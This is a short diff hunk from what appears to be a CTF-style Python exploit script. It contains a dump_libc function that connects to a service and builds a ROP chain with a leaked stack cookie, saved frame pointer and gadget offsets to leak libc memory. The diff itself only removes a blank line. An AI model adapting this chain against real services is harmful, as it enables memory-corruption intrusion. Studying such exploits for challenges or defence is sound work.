@@ -73,7 +73,6 @@ def dump_libc(write_addr, size):
     io = zio((host, 1234), print_write = False, print_read = False, timeout = 100000)
 
     rop = l64(write_addr) + 'A' * (8200 - 8) + l64(stack_cookie) + l64(saved_rbp)
-
     rop += l64(base + 0xec6) + 'A' * 8 + l64(0) + 'B' * 8 + l64(saved_rbp - 0x70 - 0x2000) + l64(size) + l64(libc_base) + l64(4)
     rop += l64(base + 0xeb0)
 
